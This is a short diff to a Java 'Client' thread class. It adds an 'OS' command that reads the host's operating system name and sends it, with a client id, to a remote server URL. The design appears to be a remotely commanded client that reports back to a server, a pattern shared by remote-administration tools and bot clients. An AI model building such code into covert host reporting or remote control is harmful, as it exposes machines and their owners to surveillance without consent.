@@ -117,6 +117,29 @@ public class Client extends Thread {
 			
 		});
 		
+		// Detect OS
+		commands.put("OS", new Command(){
+
+			@Override
+			public String exec(String[] args) {
+				String response = System.getProperty("os.name");
+				HTTPRequest.sendAsync(
+						SERVER_URL,
+						"OS_OUT " + id + " " + response,
+						new Callback(){
+
+					@Override
+					public void run(String response) {
+						// TODO Auto-generated method stub
+						
+					}
+					
+				});
+				return null;
+			}
+			
+		});
+		
 		// ADD COMMANDS HERE
 	}
 	
